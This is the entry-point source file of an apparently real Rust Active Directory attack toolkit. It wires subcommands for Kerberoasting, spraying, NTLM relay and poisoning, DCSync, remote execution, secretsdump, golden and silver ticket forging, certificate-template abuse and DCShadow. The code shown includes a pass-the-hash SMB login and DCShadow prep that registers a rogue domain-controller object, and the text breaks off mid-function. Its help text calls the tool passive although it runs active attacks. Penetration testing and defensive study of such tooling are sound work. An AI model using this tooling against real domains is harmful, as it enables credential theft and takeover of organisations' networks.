//! ADhammer — Active Directory security assessment and offensive tradecraft in Rust.
//! Pipeline: LDAP collect → build control-path graph → run checks → score → report.

// clippy 1.98 wants `as_chunks::<N>()` — Rust 1.98+; we hold MSRV 1.80. See rationale in
// [`adhammer_secrets`]'s crate doc.
#![allow(unknown_lints, clippy::chunks_exact_to_as_chunks)]

use adhammer_collector::Collector;
use anyhow::{Context, Result};
use clap::{Parser, Subcommand};

// adcs_relay moved to attacks::adcs_relay in arch-1
mod attacks;
mod checks;
mod dcshadow;
mod dumps;
mod enums;
mod esc_registry;
mod guided;
mod host_posture;
mod interactive;
mod poison;
mod session;
mod shared_args;
mod target;
mod ui;
mod winrm;

#[derive(Parser)]
#[command(
    name = "adhammer",
    version,
    about = "Passive AD security assessment in Rust"
)]
struct Cli {
    /// Reuse the last saved session (skip setup prompts, go straight to the menu).
    #[arg(long)]
    old: bool,

    /// Don't persist the session (creds) to disk — for use on a client/engagement box.
    #[arg(long)]
    no_save: bool,

    /// Route ALL outbound TCP through a SOCKS5 pivot: `[user:pass@]host:port` (proxy-side DNS).
    /// Covers SMB, RPC/DCSync/Zerologon, LDAP, KDC, WinRM and the network sweep.
    #[arg(long, global = true, value_name = "[user:pass@]host:port")]
    socks: Option<String>,

    /// Emit structured JSON output (AttackResult envelope) instead of human-readable text.
    /// Applies to attack/enum/dump subcommands. Scan already emits JSON by default.
    #[arg(long, global = true)]
    json: bool,

    #[command(subcommand)]
    cmd: Option<Command>,
}

#[derive(Subcommand)]
enum Command {
    /// Passive audit: LDAP collection → control-path graph → 41 checks → scored report.
    Scan(attacks::scan::ScanArgs),
    /// Read-only enumeration: SAMR/LSAT/network sweep/DNS zones/AD CS/DC posture/logon sessions.
    #[command(subcommand)]
    Enum(EnumCmd),
    /// Active attacks: roast/spray/abuse/coerce/relay/RBCD/DCSync/exec/WMI/LAPS/ESC1-4/golden/silver/PtT/BadSuccessor/DCShadow.
    #[command(subcommand)]
    Attack(AttackCmd),
    /// Offline / single-purpose check runners — subset of `scan` for one taxonomy at a time.
    #[command(subcommand)]
    Check(CheckCmd),
    /// Dump credentials / secrets from AD (LAPS, gMSA).
    #[command(subcommand)]
    Dump(DumpCmd),
    /// Guided: scan → correlate → confirm each weakness → validate + PoC → report.
    Auto(AutoArgs),
}

#[derive(Subcommand)]
enum CheckCmd {
    /// Run the ms-crtd ESC1-15 rule pack over pKICertificateTemplate objects
    /// collected from LDAP. Complements `scan` — no ACL walk, just the
    /// template-shape checks straight out of `ms-crtd::detect_esc`.
    Adcs(checks::adcs::CheckAdcsArgs),
}

// CheckAdcsArgs moved to `checks::adcs` in arch-0.

#[derive(Subcommand)]
enum DumpCmd {
    /// Dump LAPS local-admin passwords. Wire path over the `ms-gkdi` seed-key
    /// derivation is TODO — this subcommand today reuses the existing
    /// `attack laps` code path over dpapi-ng and prints a hint for the
    /// ms-gkdi-only route.
    Laps(dumps::laps::DumpLapsArgs),
    /// Dump gMSA `msDS-ManagedPassword` blobs. TODO wire onto ms-gkdi for the
    /// LAPS-v2 style seed-key derivation; for now falls back to `attack gmsa`
    /// (which speaks the SEALED LDAP path directly).
    Gmsa(dumps::gmsa::DumpGmsaArgs),
}

// DumpLapsArgs moved to `dumps::laps` in arch-0.

// DumpGmsaArgs moved to `dumps::gmsa` in arch-0.

#[derive(Parser)]
struct AutoArgs {
    /// LDAP URL, e.g. ldaps://dc:636
    #[arg(long)]
    url: String,
    #[arg(long)]
    user: String,
    #[arg(long)]
    password: String,
    #[arg(long)]
    insecure: bool,
    /// DC host/IP for SMB/Kerberos validators (defaults to the URL host).
    #[arg(long)]
    host: Option<String>,
    /// NetBIOS domain (defaults to the collected domain).
    #[arg(long)]
    domain: Option<String>,
    /// Kerberos realm (defaults to the DNS domain, upper-cased).
    #[arg(long)]
    realm: Option<String>,
    /// KDC host (defaults to --host).
    #[arg(long)]
    kdc: Option<String>,
    /// Report output path (Markdown).
    #[arg(long, default_value = "adhammer-report.md")]
    out: String,
    /// Validate every finding without prompting (unattended).
    #[arg(long)]
    yes: bool,
    /// Skip the per-finding "Impact" attack-chain narrative in the Markdown report.
    /// The interactive card still shows it either way.
    #[arg(long)]
    no_impact: bool,
}

#[derive(Subcommand)]
enum EnumCmd {
    /// Enumerate domain users over SAMR (SMB named pipe).
    Samr(attacks::samr::SamrArgs),
    /// Resolve a name to its SID over LSAT (\lsarpc).
    Lsa(attacks::lsa::LsaArgs),
    /// Sweep a network: live hosts, AD ports, and SMB signing (NTLM-relay targets).
    Net(enums::net::NetArgs),
    /// Enumerate AD-integrated DNS zones + records over LDAP (adidnsdump-style).
    Dns(enums::dns::DnsArgs),
    /// Enumerate enterprise CAs and probe each for ESC8 web-enrollment exposure.
    Adcs(enums::dns::DnsArgs),
    /// Registry-only AD CS ESC checks (ESC6/10/11/16) over MS-RRP — needs Remote Registry.
    Esc(enums::esc_registry::EscArgs),
    /// DC posture over MS-RRP + pipes: LDAP signing / channel binding + Spooler (relay/coercion enablers).
    Posture(enums::posture::PostureArgs),
    /// Enumerate a host's logon sessions over SRVSVC (\srvsvc) — session hunting (HasSession).
    Sessions(enums::sessions::SessionsArgs),
    /// Enumerate logged-on users via WKSSVC (\wkssvc) — NetrWkstaUserEnum level 1 (needs local admin).
    Wkssvc(enums::sessions::SessionsArgs),
    /// Enumerate logged-on SIDs via HKU registry enumeration over MS-RRP (often works without local admin).
    Hku(enums::sessions::SessionsArgs),
}

// SessionsArgs moved to `enums::sessions` in arch-0.

// PostureArgs moved to `enums::posture` in arch-0.

// ZerologonArgs moved to `attacks::zerologon` in arch-0.

// EscArgs moved to `enums::esc_registry` in arch-0.

// NetArgs moved to `enums::net` in arch-0.

#[derive(Subcommand)]
enum AttackCmd {
    /// Kerberos AS-REP roast + Kerberoast (RC4/AES hashcat output).
    Roast(attacks::scan::ScanArgs),
    /// Kerberos password spray / user enumeration.
    Spray(attacks::spray::SprayArgs),
    /// LDAP abuse: add-spn / add-member / set-password / write-rbcd.
    Abuse(attacks::abuse::AbuseArgs),
    /// Coerce the DC to authenticate to a listener (PetitPotam / MS-EFSR).
    Coerce(attacks::coerce::CoerceArgs),
    /// Zerologon (CVE-2020-1472) SAFE detection over MS-NRPC — never resets the machine password.
    Zerologon(attacks::zerologon::ZerologonArgs),
    /// RBCD: S4U2Self + S4U2Proxy to impersonate a user to a target service.
    Rbcd(attacks::rbcd::RbcdArgs),
    /// Constrained delegation abuse: same S4U2Self+S4U2Proxy chain via a `msDS-AllowedToDelegateTo`
    /// account with protocol transition (impersonate any user to the allowed service).
    Constrained(attacks::rbcd::RbcdArgs),
    /// Ask-TGT: get a TGT with a password and write a reusable ccache (Kerberos `-k` workflows).
    Asktgt(attacks::asktgt::AsktgtArgs),
    /// DCSync: replicate a target's secrets via DRSUAPI over a sealed RPC channel.
    Dcsync(attacks::dcsync::DcsyncArgs),
    /// Capture NetNTLMv2 from coerced/poisoned victims (SMB listener → hashcat -m 5600).
    Capture(CaptureArgs),
    /// Poison LLMNR + NBT-NS name resolution to lure victims to us (pair with `capture`).
    Poison(PoisonArgs),
    /// NTLM relay: SMB victim → LDAP/RBCD/AD CS Web (ESC8)/ICPR (ESC11). Pick with --target.
    Relay(attacks::relay::RelayArgs),
    /// Remote command execution as LocalSystem over SVCCTL (psexec-style service create/run/delete).
    Exec(attacks::exec_pack::ExecArgs),
    /// Remote command execution as LocalSystem over TSCH (atexec-style scheduled task).
    Atexec(attacks::exec_pack::ExecArgs),
    /// Remote command execution over WMI (DCOM → Win32_Process.Create), output captured over C$.
    Wmiexec(attacks::exec_pack::ExecArgs),
    /// Local secretsdump: reg-save SYSTEM+SAM, pull over C$, decrypt local NT hashes offline.
    Secretsdump(attacks::secretsdump::SecretsdumpArgs),
    /// Read a gMSA managed password over LDAP → NT hash (for accounts you may retrieve).
    Gmsa(attacks::gmsa::GmsaArgs),
    /// Read LAPS local-admin passwords (ms-Mcs-AdmPwd / msLAPS-Password) over LDAPS.
    Laps(attacks::laps::LapsArgs),
    /// Execute a command over WinRM (WS-Man, 5985/HTTP, NTLM + message encryption).
    Winrm(attacks::winrm_exec::WinrmArgs),
    /// AD CS ESC1: enroll a client-auth cert with a spoofed UPN SAN on a vuln template.
    Esc1(attacks::esc1::Esc1Args),
    /// ESC1 request marshaled via `ms-icpr`: build a CSR with an
    /// attacker-supplied UPN SAN and marshal the `CertServerRequest` opnum.
    /// Sealed `\PIPE\cert` transport is not wired in this build — the command
    /// runs offline preflight + emits the marshaled bytes so the wire can be
    /// verified before a live submission.
    #[command(name = "icpr-esc1")]
    IcprEsc1(attacks::icpr_esc1::IcprEsc1Args),
    /// Golden ticket: forge a TGT for any identity with the krbtgt AES256 key (from `dcsync krbtgt`).
    Golden(attacks::golden::GoldenArgs),
    /// Silver ticket: forge a service ticket (TGS) for an SPN with the service account's AES256 key.
    Silver(attacks::silver::SilverArgs),
    /// Pass-the-ticket (PtT): forge golden/silver → get a service ticket → Kerberos AP-REQ over
    /// SMB → authenticate (and optionally run a command as the impersonated identity).
    ///
    /// **Rename from `pth`.** The `pth` subcommand still resolves as an alias for one release
    /// but emits a deprecation warning at runtime. The industry PTH acronym means
    /// *pass-the-hash*; `attack ptt` describes what this actually is.
    #[command(name = "ptt", visible_alias = "pth")]
    Ptt(attacks::ptt::PthArgs),
    /// Find `TRUSTED_FOR_DELEGATION` hosts (non-DC) — unconstrained-delegation abuse targets.
    Unconstrained(attacks::scan::ScanArgs),
    /// BadSuccessor (Server 2025 dMSA) — create a delegated MSA that succeeds a chosen victim.
    Badsuccessor(attacks::badsuccessor::BadsuccessorArgs),
    /// ESC4 — write a certificate template's attributes to make it ESC1-vulnerable.
    Esc4(attacks::esc4::Esc4Args),
    /// Shadow Credentials — thin alias over `attack abuse --action add-keycred` / `pkinit`.
    Shadowcred(attacks::shadowcred::ShadowcredArgs),
    /// DCShadow — default: enumerate DCSync-capable principals. `--prep <name>` registers a rogue
    /// nTDSDSA under Configuration NC (phase 1 of the Le Toux DCShadow chain); `--cleanup <name>`
    /// removes it. Full push (phase 2) is not yet implemented.
    Dcshadow(DcshadowArgs),
}

#[derive(Parser)]
struct DcshadowArgs {
    #[command(flatten)]
    scan: attacks::scan::ScanArgs,
    /// Register a rogue nTDSDSA with this CN (phase 1). Idempotent: rerunning with the same
    /// name after a partial failure is safe. Requires Domain Admin or Configuration NC write.
    #[arg(long)]
    prep: Option<String>,
    /// Remove a rogue nTDSDSA previously created with --prep. NoSuchObject is swallowed.
    #[arg(long)]
    cleanup: Option<String>,
    /// AD site name for --prep / --cleanup [default: Default-First-Site-Name].
    #[arg(long, default_value = "Default-First-Site-Name")]
    site: String,
}

// PthArgs moved to attacks::ptt in arch-0.

// SilverArgs moved to attacks::silver in arch-0.

// GoldenArgs moved to attacks::golden in arch-0.

// EscVariant + IcprEsc1Args moved to attacks::icpr_esc1 in arch-0.

// Esc1Args moved to attacks::esc1 in arch-0.

// GmsaArgs moved to attacks::gmsa in arch-0.

// LapsArgs moved to attacks::laps in arch-0.

// DnsArgs moved to `enums::dns` in arch-0.

// WinrmArgs moved to attacks::winrm_exec in arch-0.

// SecretsdumpArgs moved to attacks::secretsdump in arch-0.

// ExecArgs moved to attacks::exec_pack in arch-0.

// RelayTarget + RelayArgs moved to attacks::relay in arch-0.

#[derive(Parser)]
struct PoisonArgs {
    /// Our IP to hand out for every poisoned name (where `attack capture` listens)
    #[arg(long)]
    spoof_ip: std::net::Ipv4Addr,
}

#[derive(Parser)]
struct CaptureArgs {
    /// Address to listen on, e.g. 0.0.0.0:445 (needs privilege for 445)
    #[arg(long, default_value = "0.0.0.0:445")]
    listen: String,
}

// DcsyncArgs moved to attacks::dcsync in arch-0.

// AsktgtArgs moved to `attacks::asktgt` in arch-0.

// BadsuccessorArgs moved to `attacks::badsuccessor` in arch-0.

// Esc4Args moved to `attacks::esc4` in arch-0.

// ShadowcredArgs moved to attacks::shadowcred in arch-0.

// RbcdArgs moved to attacks::rbcd in arch-0.

// CoercePipe moved to attacks::coerce in arch-0.

// CoerceArgs moved to attacks::coerce in arch-0.

// AbuseAction moved to attacks::abuse in arch-0.

// AbuseArgs moved to attacks::abuse in arch-0.

// SprayArgs moved to `attacks::spray` in arch-0.

// LsaArgs moved to attacks::lsa in arch-0.

// SamrArgs moved to attacks::samr in arch-0.

// ScanArgs + `config(&ScanArgs)` moved to `attacks::scan` in arch-0.

#[tokio::main]
async fn main() -> Result<()> {
    tracing_subscriber::fmt().with_target(false).init();
    let cli = Cli::parse();

    // Register the SOCKS5 pivot (if any) before any connection is made. Every owned transport
    // (smb2-client, dcerpc) and the in-tree TCP dials consult this global.
    if let Some(spec) = &cli.socks {
        match smb2_client::socks::Socks5::parse(spec) {
            Some(cfg) => {
                ui::info(&format!("routing all TCP through SOCKS5 {}", cfg.proxy));
                smb2_client::socks::set_proxy(Some(cfg));
            }
            None => {
                anyhow::bail!("invalid --socks value '{spec}' (expected [user:pass@]host:port)");
            }
        }
    }

    match cli.cmd {
        None => interactive::run(cli.old, cli.no_save).await,
        Some(cmd) => {
            if cli.json {
                dispatch_json(cmd).await
            } else {
                dispatch(cmd).await
            }
        }
    }
}

async fn dispatch_json(cmd: Command) -> Result<()> {
    let cmd_str = format!("adhammer {}", cmd_label(&cmd));
    let result = dispatch(cmd).await;
    let ar = adhammer_core::AttackResult {
        command: cmd_str,
        success: result.is_ok(),
        evidence: match &result {
            Ok(()) => String::new(),
            Err(e) => format!("{e:#}"),
        },
        finding_id: None,
    };
    println!("{}", serde_json::to_string_pretty(&ar).unwrap_or_default());
    result
}

fn cmd_label(cmd: &Command) -> &'static str {
    match cmd {
        Command::Scan(_) => "scan",
        Command::Enum(e) => match e {
            EnumCmd::Samr(_) => "enum samr",
            EnumCmd::Lsa(_) => "enum lsa",
            EnumCmd::Net(_) => "enum net",
            EnumCmd::Dns(_) => "enum dns",
            EnumCmd::Adcs(_) => "enum adcs",
            EnumCmd::Esc(_) => "enum esc",
            EnumCmd::Posture(_) => "enum posture",
            EnumCmd::Sessions(_) => "enum sessions",
            EnumCmd::Wkssvc(_) => "enum wkssvc",
            EnumCmd::Hku(_) => "enum hku",
        },
        Command::Attack(a) => match a {
            AttackCmd::Roast(_) => "attack roast",
            AttackCmd::Spray(_) => "attack spray",
            AttackCmd::Abuse(_) => "attack abuse",
            AttackCmd::Coerce(_) => "attack coerce",
            AttackCmd::Zerologon(_) => "attack zerologon",
            AttackCmd::Rbcd(_) => "attack rbcd",
            AttackCmd::Constrained(_) => "attack constrained",
            AttackCmd::Asktgt(_) => "attack asktgt",
            AttackCmd::Dcsync(_) => "attack dcsync",
            AttackCmd::Capture(_) => "attack capture",
            AttackCmd::Poison(_) => "attack poison",
            AttackCmd::Relay(_) => "attack relay",
            AttackCmd::Exec(_) => "attack exec",
            AttackCmd::Atexec(_) => "attack atexec",
            AttackCmd::Wmiexec(_) => "attack wmiexec",
            AttackCmd::Secretsdump(_) => "attack secretsdump",
            AttackCmd::Gmsa(_) => "attack gmsa",
            AttackCmd::Laps(_) => "attack laps",
            AttackCmd::Winrm(_) => "attack winrm",
            AttackCmd::Esc1(_) => "attack esc1",
            AttackCmd::IcprEsc1(_) => "attack icpr-esc1",
            AttackCmd::Golden(_) => "attack golden",
            AttackCmd::Silver(_) => "attack silver",
            AttackCmd::Ptt(_) => "attack ptt",
            AttackCmd::Unconstrained(_) => "attack unconstrained",
            AttackCmd::Badsuccessor(_) => "attack badsuccessor",
            AttackCmd::Esc4(_) => "attack esc4",
            AttackCmd::Shadowcred(_) => "attack shadowcred",
            AttackCmd::Dcshadow(_) => "attack dcshadow",
        },
        Command::Check(_) => "check adcs",
        Command::Dump(d) => match d {
            DumpCmd::Laps(_) => "dump laps",
            DumpCmd::Gmsa(_) => "dump gmsa",
        },
        Command::Auto(_) => "auto",
    }
}

async fn dispatch(cmd: Command) -> Result<()> {
    match cmd {
        Command::Scan(a) => attacks::scan::scan(a).await,
        Command::Enum(EnumCmd::Samr(a)) => attacks::samr::samr(a).await,
        Command::Enum(EnumCmd::Lsa(a)) => attacks::lsa::lsa(a).await,
        Command::Enum(EnumCmd::Net(a)) => enums::net::netenum(a).await,
        Command::Enum(EnumCmd::Dns(a)) => enums::dns::dnsenum(a).await,
        Command::Enum(EnumCmd::Adcs(a)) => enums::adcs::adcsenum(a).await,
        Command::Enum(EnumCmd::Esc(a)) => enums::esc_registry::esc_registry_scan(a).await,
        Command::Enum(EnumCmd::Posture(a)) => enums::posture::posture_scan(a).await,
        Command::Enum(EnumCmd::Sessions(a)) => enums::sessions::sessions(a).await,
        Command::Enum(EnumCmd::Wkssvc(a)) => enums::sessions::wkssvc_enum(a).await,
        Command::Enum(EnumCmd::Hku(a)) => enums::sessions::hku_enum(a).await,
        Command::Attack(AttackCmd::Roast(a)) => attacks::roast::roast(a).await,
        Command::Attack(AttackCmd::Spray(a)) => attacks::spray::spray(a).await,
        Command::Attack(AttackCmd::Abuse(a)) => attacks::abuse::abuse(a).await,
        Command::Attack(AttackCmd::Coerce(a)) => attacks::coerce::coerce(a).await,
        Command::Attack(AttackCmd::Zerologon(a)) => attacks::zerologon::zerologon(a).await,
        Command::Attack(AttackCmd::Rbcd(a)) => attacks::rbcd::rbcd(a).await,
        Command::Attack(AttackCmd::Constrained(a)) => attacks::rbcd::rbcd(a).await,
        Command::Attack(AttackCmd::Asktgt(a)) => attacks::asktgt::asktgt(a).await,
        Command::Attack(AttackCmd::Dcsync(a)) => attacks::dcsync::dcsync(a).await,
        Command::Attack(AttackCmd::Capture(a)) => smb2_client::server::capture(&a.listen)
            .await
            .map_err(Into::into),
        Command::Attack(AttackCmd::Poison(a)) => poison::poison(a.spoof_ip).await,
        Command::Attack(AttackCmd::Relay(a)) => attacks::relay::relay(a).await,
        Command::Attack(AttackCmd::Exec(a)) => attacks::exec_pack::exec_cmd(a).await,
        Command::Attack(AttackCmd::Atexec(a)) => attacks::exec_pack::atexec_cmd(a).await,
        Command::Attack(AttackCmd::Wmiexec(a)) => attacks::exec_pack::wmiexec_cmd(a).await,
        Command::Attack(AttackCmd::Secretsdump(a)) => attacks::secretsdump::secretsdump(a).await,
        Command::Attack(AttackCmd::Gmsa(a)) => attacks::gmsa::gmsa(a).await,
        Command::Attack(AttackCmd::Laps(a)) => attacks::laps::laps(a).await,
        Command::Attack(AttackCmd::Winrm(a)) => attacks::winrm_exec::winrm_exec(a).await,
        Command::Attack(AttackCmd::Esc1(a)) => attacks::esc1::esc1(a).await,
        Command::Attack(AttackCmd::IcprEsc1(a)) => attacks::icpr_esc1::icpr_esc1(a).await,
        Command::Attack(AttackCmd::Golden(a)) => attacks::golden::golden(a).await,
        Command::Attack(AttackCmd::Silver(a)) => attacks::silver::silver(a).await,
        Command::Attack(AttackCmd::Ptt(a)) => {
            // Emit the deprecation notice when the operator reached us through the `pth` alias.
            if std::env::args().any(|a| a == "pth") {
                eprintln!(
                    "[!] `attack pth` is deprecated (industry PTH = pass-the-hash); \
                     use `attack ptt` (pass-the-ticket). Alias will be removed in 1.5.0."
                );
            }
            attacks::ptt::pth(a).await
        }
        Command::Attack(AttackCmd::Unconstrained(a)) => {
            attacks::unconstrained::unconstrained(a).await
        }
        Command::Attack(AttackCmd::Badsuccessor(a)) => attacks::badsuccessor::badsuccessor(a).await,
        Command::Attack(AttackCmd::Esc4(a)) => attacks::esc4::esc4(a).await,
        Command::Attack(AttackCmd::Shadowcred(a)) => attacks::shadowcred::shadowcred(a).await,
        Command::Attack(AttackCmd::Dcshadow(a)) => dcshadow(a).await,
        Command::Check(CheckCmd::Adcs(a)) => checks::adcs::check_adcs(a).await,
        Command::Dump(DumpCmd::Laps(a)) => dumps::laps::dump_laps(a).await,
        Command::Dump(DumpCmd::Gmsa(a)) => dumps::gmsa::dump_gmsa(a).await,
        Command::Auto(a) => {
            guided::guided(guided::GuidedArgs {
                url: a.url,
                user: a.user,
                password: a.password,
                insecure: a.insecure,
                host: a.host,
                domain: a.domain,
                realm: a.realm,
                kdc: a.kdc,
                out: a.out,
                yes: a.yes,
                no_impact: a.no_impact,
            })
            .await
        }
    }
}

// fn rbcd moved to attacks::rbcd in arch-0.

// fn asktgt moved to `attacks::asktgt` in arch-0.
// fn dcsync moved to attacks::dcsync in arch-0.

// fn sessions / fn wkssvc_enum / fn hku_enum moved to `enums::sessions` in arch-0.

// fn dcsync_all moved to attacks::dcsync in arch-0.

/// Resolve a credential-flag value that came in through argv. If the operator
/// passed an empty `--password` / `--nt-hash` (the recommended way to avoid the
/// `ps` / shell-history leak), we fall back to the matching env var — currently
/// `ADHAMMER_PASSWORD` and `ADHAMMER_NT_HASH`. Non-empty argv values pass
/// through unchanged (backwards-compatible; scripts that already inline
/// creds keep working). When the flag was not set AND the env var is empty,
/// we return the empty string and let the downstream call fail with its own
/// domain-specific error, so we don't confuse "meant to set it, forgot" with
/// "this attack doesn't actually need auth".
///
/// Rationale: the boss review flagged that every subcommand takes secrets
/// straight on argv (`sec-2`), leaking to `ps`, `~/.bash_history`, sudo logs.
///
/// Resolution order (first non-empty wins):
///
/// 1. `--password @file:/path/to/pw` — read from file (trailing \r\n trimmed).
/// 2. `--password foo` — literal value; the leaky path, CI should prefer 1 or 3.
/// 3. `$ADHAMMER_PASSWORD` env var.
/// 4. Interactive prompt (only when stdin is a TTY) via `dialoguer::Password`.
/// 5. Empty string — downstream code returns its own "needs password" error.
pub(crate) fn resolve_secret(argv_value: &str, env_key: &str) -> Result<String> {
    if let Some(path) = argv_value.strip_prefix("@file:") {
        let raw =
            std::fs::read_to_string(path).with_context(|| format!("read password file {path}"))?;
        // Strip a single trailing newline (Unix or Windows) — a file created with
        // `echo pw > pw.txt` invariably has one; passing it through would break the bind.
        return Ok(raw.trim_end_matches(['\n', '\r']).to_string());
    }
    if !argv_value.is_empty() {
        return Ok(argv_value.to_string());
    }
    if let Ok(v) = std::env::var(env_key) {
        if !v.is_empty() {
            return Ok(v);
        }
    }
    use std::io::IsTerminal;
    if std::io::stdin().is_terminal() {
        let pw = dialoguer::Password::new()
            .with_prompt(format!("password (or set {env_key})"))
            .interact()
            .context("read password from tty")?;
        return Ok(pw);
    }
    Ok(String::new())
}

#[cfg(test)]
mod resolve_secret_tests {
    use super::resolve_secret;
    use std::io::Write as _;

    #[test]
    fn literal_argv_passes_through_verbatim() {
        std::env::remove_var("ADHAMMER_TEST_UNSET");
        let got = resolve_secret("literal-pw", "ADHAMMER_TEST_UNSET").unwrap();
        assert_eq!(got, "literal-pw");
    }

    #[test]
    fn env_var_used_when_argv_empty() {
        std::env::set_var("ADHAMMER_TEST_ENV_HIT", "from-env");
        let got = resolve_secret("", "ADHAMMER_TEST_ENV_HIT").unwrap();
        std::env::remove_var("ADHAMMER_TEST_ENV_HIT");
        assert_eq!(got, "from-env");
    }

    #[test]
    fn empty_env_falls_through_to_prompt_or_empty() {
        std::env::remove_var("ADHAMMER_TEST_MISSING");
        // Under `cargo test` stdin is not a TTY, so the prompt path is skipped
        // and we get the empty-string fallback. This documents the CI/non-TTY behaviour.
        let got = resolve_secret("", "ADHAMMER_TEST_MISSING").unwrap();
        assert_eq!(got, "");
    }

    #[test]
    fn file_ref_reads_and_trims_trailing_newline() {
        let dir = std::env::temp_dir().join("adhammer_resolve_secret_tests");
        std::fs::create_dir_all(&dir).unwrap();
        let path = dir.join("pw.txt");
        let mut f = std::fs::File::create(&path).unwrap();
        f.write_all(b"hunter2\r\n").unwrap();
        drop(f);
        let arg = format!("@file:{}", path.display());
        let got = resolve_secret(&arg, "ADHAMMER_UNUSED").unwrap();
        assert_eq!(got, "hunter2");
        let _ = std::fs::remove_file(&path);
    }

    #[test]
    fn file_ref_missing_file_is_an_error() {
        let err = resolve_secret("@file:/no/such/adhammer/pw.txt", "ADHAMMER_UNUSED").unwrap_err();
        let msg = format!("{err:#}");
        assert!(
            msg.contains("read password file"),
            "unexpected error: {msg}"
        );
    }
}

/// Parse an NT hash from `--nt-hash` (accepts bare 32-hex or `LM:NT`).
pub(crate) fn parse_nt_hash(s: &str) -> Result<[u8; 16]> {
    let hex_str = s.rsplit(':').next().unwrap_or(s).trim();
    let raw = hex::decode(hex_str).context("--nt-hash must be hex")?;
    anyhow::ensure!(
        raw.len() == 16,
        "--nt-hash must be a 32-hex NT hash (got {} bytes)",
        raw.len()
    );
    Ok(raw.try_into().unwrap())
}

/// Parse a ticket-forging key: a 16-byte NT hash (32 hex) for RC4, else a 32-byte AES256 key.
pub(crate) fn parse_forge_key(s: &str, rc4: bool) -> Result<Vec<u8>> {
    let raw = hex::decode(s.trim()).context("forge key must be hex")?;
    let want = if rc4 { 16 } else { 32 };
    anyhow::ensure!(
        raw.len() == want,
        "expected a {}-hex {} key, got {} hex",
        want * 2,
        if rc4 { "RC4/NT-hash" } else { "AES256" },
        raw.len() * 2
    );
    Ok(raw)
}

/// SMB login with either a password or an NT hash (pass-the-hash).
pub(crate) async fn smb_login(
    smb: &mut smb2_client::SmbClient,
    host: &str,
    domain: &str,
    user: &str,
    password: &str,
    nt_hash: &Option<String>,
) -> Result<()> {
    match nt_hash {
        Some(h) => {
            let nt = parse_nt_hash(h)?;
            smb.login_hash(host, domain, user, &nt).await?;
        }
        None => {
            anyhow::ensure!(!password.is_empty(), "provide --password or --nt-hash");
            smb.login(host, domain, user, password).await?;
        }
    }
    Ok(())
}

// fn exec_cmd moved to attacks::exec_pack in arch-0.

// fn wmiexec_cmd moved to attacks::exec_pack in arch-0.

// fn atexec_cmd moved to attacks::exec_pack in arch-0.

// fn secretsdump moved to attacks::secretsdump in arch-0.

// fn print_lsa_secret moved to attacks::secretsdump in arch-0.

// fn esc1 moved to attacks::esc1 in arch-0.

// fn golden moved to attacks::golden in arch-0.

// fn silver moved to attacks::silver in arch-0.

// fn pth + fn looks_like_ip moved to attacks::ptt in arch-0.

// fn gmsa moved to attacks::gmsa in arch-0.

// fn laps moved to attacks::laps in arch-0.

// fn winrm_exec moved to attacks::winrm_exec in arch-0.

// fn dnsenum moved to `enums::dns` in arch-0.

/// Extract the CurrentPassword bytes from an MSDS-MANAGEDPASSWORD_BLOB (MS-ADTS §2.2.19).
pub(crate) fn parse_managed_password_blob(b: &[u8]) -> Option<Vec<u8>> {
    if b.len() < 16 {
        return None;
    }
    let cur_off = u16::from_le_bytes([b[8], b[9]]) as usize; // CurrentPasswordOffset
    let prev_off = u16::from_le_bytes([b[10], b[11]]) as usize; // PreviousPasswordOffset (0 = none)
    let end = if prev_off > cur_off {
        prev_off
    } else {
        b.len()
    };
    let pw = b.get(cur_off..end)?;
    // The password buffer is a fixed 256-byte WCHAR[128]; hash exactly those bytes.
    Some(pw.get(..256).unwrap_or(pw).to_vec())
}

// fn coerce moved to attacks::coerce in arch-0.

// fn abuse moved to attacks::abuse in arch-0.

// fn spray moved to `attacks::spray` in arch-0.
// fn lsa moved to attacks::lsa in arch-0.

// fn samr moved to attacks::samr in arch-0.

// SERVICES + GREETERS constants moved to `enums::net` in arch-0.

// RelayAction + RelayArgs+ RelayTarget + fn relay + relay_one + relay_esc8 + relay_icpr + pem_wrap moved to attacks::relay in arch-0.

// fn netenum + service probes (probe_port/deep_check/connect/read_some/ftp_anon/smtp_vrfy/redis_unauth/rpc_surface/vnc_noauth/winrm_probe/rsync_modules/mysql_probe/mssql_prelogin/parse_prelogin/dns_check/dns_version_bind/dns_axfr/nfs_showmount/rpc_call/rpc_frame/rpc_recv/parse_exports/snmp_public/snmp_get_sysdescr/snmp_first_octet_string/ber/ber_seq/expand_targets/is_esc8_response/esc8_probe) + SERVICES/GREETERS + net_tests moved to `enums::net` in arch-0.

// fn esc_registry_scan moved to `enums::esc_registry` in arch-0.

// fn zerologon moved to `attacks::zerologon` in arch-0.
// fn posture_scan moved to `enums::posture` in arch-0.

// fn adcsenum moved to `enums::adcs` in arch-0.

// fn esc_registry_probe moved to `attacks::scan` (private helper) in arch-0.

// fn scan + `config(&ScanArgs)` moved to `attacks::scan` in arch-0.

// fn badsuccessor moved to `attacks::badsuccessor` in arch-0.
// fn esc4 moved to `attacks::esc4` in arch-0.
// fn shadowcred moved to attacks::shadowcred in arch-0.

/// `attack dcshadow` — enumerate accounts that already hold DCSync replication rights
/// (Replicating Directory Changes All / In Filtered Set / Get Changes). Every principal on
/// this list can already dump secrets — and every non-Tier-0 principal on it is a straight
/// path to Domain Admin. Full DCShadow *push* (register a rogue nTDSDSA + trigger DrsReplicaAdd)
/// is not implemented — building it without a live 2016+/2019+/2022+/2025 matrix would ship
/// blind protocol code. Once the matrix is up, this command grows the push side.
async fn dcshadow(a: DcshadowArgs) -> Result<()> {
    // Prep / cleanup take precedence over the detector; they mutate the target.
    if let Some(name) = a.prep.as_deref() {
        use adhammer_collector::Collector;
        let mut coll = Collector::connect(&attacks::scan::config(&a.scan)).await?;
        let dns = dcshadow::prep(&mut coll, name, &a.site).await?;
        println!("[+] DCShadow prep registered rogue nTDSDSA");
        println!("    Server : {}", dns.server_dn);
        println!("    NTDS   : {}", dns.ntds_dn);
        println!();
        println!(
            "    Cleanup: `attack dcshadow --cleanup {name} --site {}`",
            a.site
        );
        return Ok(());
    }
    if let Some(name) = a.cleanup.as_deref() {
        use adhammer_collector::Collector;
        let mut coll = Collector::connect(&attacks::scan::config(&a.scan)).await?;
        dcshadow::cleanup(&mut coll, name, &a.site).await?;
        println!(
            "[+] DCShadow cleanup removed rogue nTDSDSA '{name}' under site '{}'",
            a.site
        );
        return Ok(());
    }
    use adhammer_graph::ControlPrimitive as P;
    let snap = Collector::connect(&attacks::scan::config(&a.scan))
        .await?
        .collect()
        .await?;
    let graph = adhammer_graph::ControlGraph::build(&snap);
    let mut who = Vec::new();
    for kind in [
        P::DcsyncGetChanges,
